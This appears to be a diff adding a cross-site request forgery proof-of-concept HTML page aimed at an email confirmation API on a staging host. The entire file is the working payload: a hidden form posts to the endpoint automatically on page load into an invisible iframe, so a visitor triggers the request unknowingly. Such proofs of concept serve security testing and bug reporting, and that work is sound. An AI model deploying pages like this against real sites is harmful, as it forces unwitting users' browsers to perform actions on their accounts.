@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>CSRF PoC — email_confirmation</title>
+<body>
+  <h1>CSRF PoC</h1>
+  <!-- Quietly submit a POST with no body (Content-Type: application/x-www-form-urlencoded; empty) -->
+  <form id="f" method="POST" action="https://staging-app.bany.dev/api/v2/user/email_confirmation" target="sink"></form>
+  <iframe name="sink" style="display:none"></iframe>
+  <script>
+    // auto-submit on load
+    document.getElementById('f').submit();
+  </script>
+</body>
